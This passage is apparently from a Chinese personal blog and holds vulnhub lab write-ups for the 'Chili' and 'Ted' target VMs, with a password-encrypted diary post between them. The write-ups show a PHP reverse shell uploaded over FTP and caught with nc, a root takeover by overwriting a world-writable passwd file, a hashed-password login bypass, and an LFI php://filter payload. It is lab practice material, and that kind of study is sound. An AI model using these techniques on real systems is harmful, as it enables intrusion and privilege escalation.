class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/chili_1]<br>└─$ ftp 192.1.1.140<br>Connected to 192.1.1.140.<br>220 (vsFTPd 3.0.3)<br>Name (192.1.1.140:kali): chili<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Switching to Binary mode.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||57740|)<br>150 Here comes the directory listing.<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">ls</span> -alih<br>229 Entering Extended Passive Mode (|||48639|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    3 1000     1000         4096 Sep 08  2020 .<br>drwxr-xr-x    3 0        0            4096 Sep 08  2020 ..<br>-rw-r--r--    1 1000     1000          220 Sep 07  2020 .bash_logout<br>-rw-r--r--    1 1000     1000         3526 Sep 07  2020 .bashrc<br>drwxr-xr-x    3 1000     1000         4096 Sep 08  2020 .<span class="hljs-built_in">local</span><br>-rw-r--r--    1 1000     1000          807 Sep 07  2020 .profile<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /home/chili<br><br>ftp&gt; <span class="hljs-built_in">cd</span> /var/www/html<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span> -alih<br>229 Entering Extended Passive Mode (|||37526|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 .<br>drwxr-xr-x    3 0        0            4096 Sep 08  2020 ..<br>drwxrwxrwx    2 0        0            4096 Sep 08  2020 .nano<br>drwxr-xr-x    2 0        0            4096 Sep 08  2020 .vim<br>-rw-r--r--    1 0        0           74290 Oct 23  2018 Chile_WEB.jpg<br>-rw-r--r--    1 0    <br></code></pre></td></tr></table></figure><h2 id="网站目录反弹-shell"><a href="#网站目录反弹-shell" class="headerlink" title="网站目录反弹 shell"></a>网站目录反弹 shell</h2><p>发现了一个目录爆破中没有拿到的文件夹 <code>.nano</code>，而且这个文件夹是完全可控的，尝试将 php 反弹 shell 的代码上传上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; put php-reverse-shell.php<br><span class="hljs-built_in">local</span>: php-reverse-shell.php remote: php-reverse-shell.php<br>229 Entering Extended Passive Mode (|||13435|)<br>150 Ok to send data.<br>100% |***********************************************************************|  5493       45.55 MiB/s    00:00 ETA<br>226 Transfer complete.<br>5493 bytes sent <span class="hljs-keyword">in</span> 00:00 (9.75 MiB/s)<br>ftp&gt; <span class="hljs-built_in">ls</span> -liah<br>229 Entering Extended Passive Mode (|||45190|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Aug 09 17:22 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r--r--    1 1000     1000            0 Sep 08  2020 index.html<br>-rw-------    1 1000     1000         5493 Aug 09 17:22 php-reverse-shell.php<br>226 Directory send OK.<br></code></pre></td></tr></table></figure><p>上传上去的文件访问有问题，看起来似乎是文件权限的问题，上传的文件默认是 600 权限，网站 www-data 用户不可读。这里我一开始没想到 ftp 还有 chmod 命令，原本是想把 index.html 给写入反弹 shell 的内容，但是 html 解析的优先级似乎更高，访问得到了如图所示的结果</p><p><img src="/pic/0ca093956b4e3e94baec4febaa5313f7_MD5.png"></p><p>使用 <code>?</code> 看自己能使用哪些命令的时候发现竟然可以使用 chmod ，我直接就是一个 <code>chmod 777 php.php</code></p><p>然后提前开启监听，浏览器访问 <code>192.1.1.140/.nano/php.php</code>，反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/chili_1]<br>└─$ sudo nc -lvnp 1234<br>listening on [any] 1234 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.140] 52810<br>Linux chili 4.19.0-10-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br> 17:43:27 up  2:06,  0 <span class="hljs-built_in">users</span>,  load average: 0.05, 0.01, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">/bin/sh: 1: python: not found</span><br><span class="hljs-string">$ which python2</span><br><span class="hljs-string">$ which python3</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@chili:/$</span><br></code></pre></td></tr></table></figure><h2 id="passwd-文件可写提权"><a href="#passwd-文件可写提权" class="headerlink" title="passwd 文件可写提权"></a>passwd 文件可写提权</h2><p>接下来就是提权的过程了，这里需要说明的是，我是在 ftp 翻看文件系统的时候，发现了 passwd 文件存在其他用户可读可写的情况，所以利用 <code>openssl passwd passwd123</code> 生成了密码的哈希，并利用 ftp 上传覆盖掉了原本的 passwd 文件。正常的情况下应该是先检查 <code>sudo -l</code> 权限，同时确认立足点是否正确，再检查敏感文件的权限和 SUID 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@chili:/$ sudo -l<br>bash: sudo: <span class="hljs-built_in">command</span> not found<br>www-data@chili:/$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@chili:/$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux chili 4.19.0-10-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br>www-data@chili:/$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:b2:10:06 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.140/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1591sec preferred_lft 1591sec<br>    inet6 fe80::20c:29ff:feb2:1006/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><p>最后就简单记录下自己打靶时的操作，上面已经做了解释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/chili_1]<br>└─$ openssl passwd passwd123 <br>$1$r5F9tOKO<span class="hljs-variable">$3</span>.v/LZvYOq7B990Nj1ie11<br><br>┌──(kali㉿kali)-[~/Downloads/chili_1]<br>└─$ vim passwd<br><br><span class="hljs-comment"># ftp上的操作</span><br>ftp&gt; get passwd<br><span class="hljs-built_in">local</span>: passwd remote: passwd<br>229 Entering Extended Passive Mode (|||61081|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> passwd (1450 bytes).<br>100% |***********************************************************************|  1450       26.09 MiB/s    00:00 ETA<br>226 Transfer complete.<br>1450 bytes received <span class="hljs-keyword">in</span> 00:00 (566.40 KiB/s)<br>ftp&gt; put passwd<br><span class="hljs-built_in">local</span>: passwd remote: passwd<br>229 Entering Extended Passive Mode (|||60464|)<br>150 Ok to send data.<br>100% |***********************************************************************|  1483       15.89 MiB/s    00:00 ETA<br>226 Transfer complete.<br>1483 bytes sent <span class="hljs-keyword">in</span> 00:00 (2.76 MiB/s)<br></code></pre></td></tr></table></figure><p>最后的最后直接 <code>su -</code> 使用 <code>passwd123</code> 直接切换为 root 用户即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@chili:/$ su -<br>su -<br>Password: passwd123<br><br>root@chili:~<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@chili:~<span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 32K<br>2097153 drwx------  3 root root 4.0K Sep  8  2020 .<br>      2 drwxr-xr-x 18 root root 4.0K Sep  7  2020 ..<br>2097156 -rw-------  1 root root  126 Sep  8  2020 .bash_history<br>2097155 -rw-r--r--  1 root root  570 Jan 31  2010 .bashrc<br>2097158 drwxr-xr-x  3 root root 4.0K Sep  8  2020 .<span class="hljs-built_in">local</span><br>2097154 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>2097163 -rw-r--r--  1 root root   47 Sep  8  2020 proof.txt<br>2097157 -rw-r--r--  1 root root  176 Sep  8  2020 .wget-hsts<br>root@chili:~<span class="hljs-comment"># cat proof.txt</span><br><span class="hljs-built_in">cat</span> proof.txt<br>Sun_CSR.Chili.af6d45da1f1181347b9e2139f23c6a5b<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>碎碎念笔记——南京大学《SICP》课堂李樾老师最后半节课</title>
    <link href="/2023/08/12ffb37057f7.html"/>
    <url>/2023/08/12ffb37057f7.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c4aed8e637642bda034a88ec5162a04f7bd7e42001f14bf646f1280e9e4e0ca9">91c22b0949579c4c6d0a72472c37960068f8ce5ba34e0aaad39d80b29bb21c698e56d8f28532ec0cc94b79226c256dddddc539089166dac4f0540824d3becb2d99cf6fc0c76fd0a33d151f5e9185101ba1ac7bf7c6c1afab00fe6e61964bcf380428e504c32a51b5b891bb869529f7ca577686783e98c98d937e2ac4fc6241a88945f2ac5c78cf5cd68eacbcc57bccac8467f46bdd31133f467a2cfae40b5537d612dcd564cef889c44d088fb933c3ae</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>dayday</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ted 靶机</title>
    <link href="/2023/08/bacb736ec337.html"/>
    <url>/2023/08/bacb736ec337.html</url>
    
    <content type="html"><![CDATA[<h1 id="Ted-靶机"><a href="#Ted-靶机" class="headerlink" title="Ted 靶机"></a>Ted 靶机</h1><p>难度比预想的高一丢丢，主要考察了 PHP 环境下对网站登录过程、cookie 和 session 的理解，以及如何使用本地文件包含漏洞来 getshell，提权方面倒是比较简单。没有兔子洞的一台靶机，可观察到的攻击面很窄，对于渗透技巧的练习来说是台好机器</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Ted]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.139   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 04:17 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.139<br>Host is up (0.00042s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br>MAC Address: 00:0C:29:39:9B:B3 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.52 seconds<br></code></pre></td></tr></table></figure><p>只有 80 端口开放？看看 UDP 扫描结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Ted]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.139                                       <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 04:20 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.139<br>Host is up (0.00036s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   open|filtered ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 00:0C:29:39:9B:B3 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.62 seconds<br></code></pre></td></tr></table></figure><p>看来大概率只有 80 端口开放，使用 nmap 进行版本探查、服务详情和默认脚本扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Ted]<br>└─$ sudo nmap -sT -sV -sC -O -p80 192.1.1.139                                      <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 04:19 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.139<br>Host is up (0.00037s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Login<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>MAC Address: 00:0C:29:39:9B:B3 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.45 seconds<br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统，80 端口是登录界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Ted]<br>└─$ sudo nmap -script=vuln -p80 192.1.1.139        <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 04:20 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.139<br>Host is up (0.00063s latency).<br><br>PORT   STATE SERVICE<br>80/tcp open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.1.1.139<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.1.1.139:80/<br>|     Form <span class="hljs-built_in">id</span>: username<br>|     Form action: authenticate.php<br>|     <br>|     Path: http://192.1.1.139:80/authenticate.php<br>|     Form <span class="hljs-built_in">id</span>: username<br>|_    Form action: authenticate.php<br>|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)<br>MAC Address: 00:0C:29:39:9B:B3 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 327.84 seconds<br></code></pre></td></tr></table></figure><p>漏洞脚本扫描也没什么结果，目录爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Ted]<br>└─$ sudo dirsearch -u http://192.1.1.139    <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.139/_23-08-04_04-27-52.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-04_04-27-52.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.139/<br><br>[04:27:52] Starting: <br>[04:27:53] 403 -  297B  - /.ht_wsr.txt                                     <br>[04:27:53] 403 -  300B  - /.htaccess.orig                                  <br>[04:27:53] 403 -  300B  - /.htaccess.bak1<br>[04:27:53] 403 -  300B  - /.htaccess.save<br>[04:27:53] 403 -  299B  - /.htaccessOLD2<br>[04:27:53] 403 -  302B  - /.htaccess.sample<br>[04:27:53] 403 -  298B  - /.htaccess_sc<br>[04:27:53] 403 -  301B  - /.htaccess_extra<br>[04:27:53] 403 -  298B  - /.htaccessOLD<br>[04:27:53] 403 -  300B  - /.htaccess_orig                                  <br>[04:27:53] 403 -  290B  - /.htm<br>[04:27:53] 403 -  298B  - /.htaccessBAK<br>[04:27:53] 403 -  291B  - /.html<br>[04:27:53] 403 -  296B  - /.htpasswds<br>[04:27:53] 403 -  300B  - /.htpasswd_test<br>[04:27:53] 403 -  297B  - /.httr-oauth<br>[04:27:54] 403 -  290B  - /.php                                            <br>[04:27:54] 403 -  291B  - /.php3<br>[04:28:04] 302 -   31B  - /authenticate.php  -&gt;  index.php                  <br>[04:28:07] 302 -    0B  - /cookie.php  -&gt;  index.html                       <br>[04:28:11] 302 -    0B  - /home.php  -&gt;  index.html                         <br>[04:28:11] 200 -  669B  - /index.php                                        <br>[04:28:12] 200 -  669B  - /index.php/login/                                 <br>[04:28:14] 302 -    0B  - /logout.php  -&gt;  index.php                        <br>[04:28:20] 403 -  299B  - /server-status                                    <br>[04:28:20] 403 -  300B  - /server-status/<br></code></pre></td></tr></table></figure><p>目录爆破发现的目录很有限，并且都跳转到了登录界面，那只能对着登录框进行下一步尝试了</p><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>登录界面的源代码也很简洁</p><p><img src="/pic/850772640fdeb12d691f9a17fcc5631c_MD5.png"></p><p>尝试是否存在 sql 注入，sqlmap 一把梭，没结果</p><p>那就先抓个包看看，实在不行就只能密码爆破了，先试试弱密码 <code>root:root</code></p><p><img src="/pic/81d4f1214a8f21b5d00a759896ed1ed0_MD5.png"></p><p>竟然有提示用户名错误，换个用户名 <code>admin</code> 试试</p><p><img src="/pic/195e57e66e90929d584f02d859092c88_MD5.png"></p><p>提示密码或者密码哈希不正确，再换个弱口令，几次尝试后发现，当密码为 admin 时，返回的结果是密码哈希值不正确</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Password hash <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> correct, make sure <span class="hljs-keyword">to</span> hash <span class="hljs-keyword">it</span> <span class="hljs-keyword">before</span> submit.<br></code></pre></td></tr></table></figure><p>接下来尝试了几种哈希，网站是<a href="https://www.sojson.com/hash.html">散列加密 | 哈希加密 |哈希解密 | 散列解密 (sojson.com)</a></p><p><img src="/pic/1f5ebd4e71bfc55c0ba705f79c03e6dd_MD5.png"></p><p>但是均失败了，然后尝试在线运行的 php 程序调用默认的哈希函数，参考了这篇文章的代码<a href="https://blog.csdn.net/qq_22471701/article/details/119668885">简单的PHP注册登录密码加密_php加密登录_炼气三千年的白起的博客-CSDN博客</a></p><p><img src="/pic/d35877afd2b23de0d5ff57d93d7a7388_MD5.png"></p><p>还是失败，接下来又考虑了开发逻辑，哈希值也可能是 js 加密后发给后端的，那我是不是要在 POST 体中多加一个哈希值的变量，但是我并不知道哈希值变量的名字应该是什么，由于前后端解析上对于变量名的接收肯定是需要一致的，所以在这里纠结了很久，最后看了眼 WP，发现我不成功的原因是哈希值大小写的问题</p><p>使用 SHA256 算法哈希后的结果改为大写，也就是 <code>8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918</code></p><p>使用这个哈希值作为 password 即可登录成功</p><p><img src="/pic/085043a3d561db9f64182d325b6f86ff_MD5.png"></p><p>登陆后的界面也是一如既往地简洁（简单），没有什么复杂的逻辑，只有两个可查看界面，home.php 和 cookie.php</p><p>home.php 中有一个搜索框，是通过 POST 方法发送的，简单尝试了一下似乎并不存在 sql 注入。</p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>使用 burp 抓包一下，burp 的 intrude 模块中有 fuzz 的字典，尝试使用这个字典跑一下</p><p><img src="/pic/1987880c88c56e78d991bf4da8994ab5_MD5.png"></p><p>意外发现这里竟然是个本地文件包含的漏洞，也可以看到 passwd 文件，找了一些文件路径试了试，用的是 burp 自带的字典和<a href="https://blog.csdn.net/qq_33020901/article/details/78810035">文件读取漏洞路径收集_PD_3569的博客-CSDN博客</a>中的字典</p><p><img src="/pic/7b52402e068eae260225968b62088c08_MD5.png"></p><p>收获并不大。自己又尝试了一下，这个本地文件包含漏洞会自动解析运行 php 文件，因此当访问 <code>logout.php</code> 时会自动退出登录。顺便试了一下不存在远程文件包含漏洞</p><p>翻看了 cookie.php，得到的信息并不多，或许是个暗示，这里提到了 <code>Cookies can be &quot;persistent&quot; or &quot;session&quot; cookies.</code></p><p>尝试了一下存不存在 cookie 注入，并没有</p><h2 id="本地文件包含-session-实现-Getshell"><a href="#本地文件包含-session-实现-Getshell" class="headerlink" title="本地文件包含 + session 实现 Getshell"></a>本地文件包含 + session 实现 Getshell</h2><p>搜一搜 <code>本地文件包含+getshell</code></p><p><img src="/pic/4be6f0ed909993f0f46696b07e7d2c80_MD5.png"></p><p>第一个链接中思路还挺全的，跟着尝试了一下，下面是有效的 PoC</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=filename<br></code></pre></td></tr></table></figure><p><img src="/pic/766adf0ee17801a131eff01840691081_MD5.png"></p><p>cookie 中 user_pref 的值被赋值给了 session 的 user_pref，之前尝试直接删除 cookie 中的 user_pref 没什么影响，搜索结果中本地包含的文件还是可以正常显示。先回到文章中的方法边看边尝试吧</p><p>日志文件似乎也是可以考虑的，不过刚才使用字典并没有跑出来日志文件的路径。而网站也没有提供文件上传的地方，phpinfo 文件也不存在，更没办法直接通过伪协议来执行 phpinfo() 函数</p><p><img src="/pic/be9a9ff00473f82caa6e77d07e32242f_MD5.png"></p><p>文章在 session+LFI getshell 